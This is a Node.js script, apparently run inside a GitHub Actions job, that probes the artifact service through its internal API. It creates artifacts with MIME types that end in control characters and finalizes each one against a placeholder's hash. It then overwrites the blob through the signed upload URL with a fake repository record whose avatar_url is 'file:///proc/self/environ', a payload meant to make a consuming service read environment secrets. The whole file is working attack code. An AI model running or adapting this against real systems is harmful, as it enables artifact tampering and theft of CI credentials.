import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const placeholder = Buffer.from('{"probe":"direct2"}');
const placeholderHash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const repo = process.env.GITHUB_REPOSITORY;
async function upload(url, bytes, mime) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {blobHTTPHeaders: {blobContentType: mime}});
  return true;
}
async function run(config, index) {
  const name = `direct2-${process.env.GITHUB_RUN_ID}-${index}-${config.label}`;
  let created;
  try {
    created = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, version: config.version,
      mimeType: StringValue.create({value: config.mime}),
    });
  } catch (e) { console.log(`DIRECT2-ERROR ${index} ${config.label} CREATE ${String(e).slice(0,300)}`); return; }
  if (!created.ok) { console.log(`DIRECT2-ERROR ${index} ${config.label} notok`); return; }
  await upload(created.signedUploadUrl, placeholder, config.mime);
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, size: String(placeholder.length),
    hash: StringValue.create({value: placeholderHash}),
  });
  const id = String(finalized.artifactId);
  const repository = `${repo}/actions/artifacts/${id}/zip`;
  const carrier = Buffer.from(JSON.stringify({full_name: repository, owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}, description:`Repo Cassette direct2 ${config.label}`, stargazers_count:0}));
  await upload(created.signedUploadUrl, carrier, config.mime);
  console.log(`DIRECT2 ${JSON.stringify({id,name,version:config.version,mime:config.mime,label:config.label,repository,expectedBytes:carrier.length})}`);
}
const configs = [
  {version:7, mime:'application/json\u0085', label:'v7trail85'},
  {version:7, mime:'application/json\u001c', label:'v7trail1c'},
  {version:7, mime:'application/json\u001f', label:'v7trail1f'},
  {version:7, mime:'application/json\u0085; charset=utf-8', label:'v7trail85param'},
];
for (let i=0;i<configs.length;i++) { try { await run(configs[i],i); } catch(e){ console.log(`DIRECT2-ERROR ${i} ${String(e).slice(0,300)}`); } }
